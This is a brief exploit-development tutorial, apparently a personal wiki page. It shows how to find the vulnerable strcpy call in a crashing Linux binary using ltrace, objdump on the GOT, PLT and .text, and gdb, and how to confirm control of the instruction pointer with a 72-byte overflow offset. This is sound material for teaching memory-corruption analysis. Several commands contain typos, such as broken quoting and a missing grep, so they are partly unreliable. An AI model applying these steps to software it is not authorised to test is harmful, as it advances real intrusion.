# ROP Finding the vulnerable function

* At this point you have been able to generate a crash on a linux binary. We now need to find the vulnerable function before progressing

```
# creating the crash 
python3 -c 'print("A"*100) > temp.txt
./binary file.txt

Segmentation fault
```

* use `ltrace` to see if there is a function that is causing the crash&#x20;

```
ltrace ./binary file.txt 2>&1 | grep SIGSEGV -B1
7120-strcpy(0x6fff3b10, "AAAAAAAAAAAAAAAAAA"...) = 0x2ffff108b
--snip--
```

* we can see that `strcpy` is the issue here causing the crash
* use `objdump` to see where in the code segment `strcpy()` is called.&#x20;
* Look at the GOT of the program and grep for `strcpy()`
* Then use the `objdump` tool to specifically query the `.plt` segment to see where the address in the GOT is referenced.
* After attaining the address use `objdump` tool once more and change the segment to `.text` and grep on the address shown in the PLT

```
objdump -R ./binary | grep strcpy
0304b00a R_386_JUMP_SLOT    strcpy
objdump -j .plt -d binary | grep b00a
70482b7:  ff 25 0a b0 04 03 jmp  *0x0304b00a 
objdump -j .text -d binary | 82b7 -B2 -A2
# you will see the vuln buffer size
# the address of strcpy@plt
# and a ret which is a good spot for a break to see 
# if your payload was successfully copied into mem 
```

* to validate your finding see if your buffer analysis was correct (72)

```
python3 -c print("A"*72 + "BBBB") > temp.txt
gdb ./binary 
run temp.txt
Program recieved signal SIGSEGV, Segmentation fault
0x42424242 in ?? ()
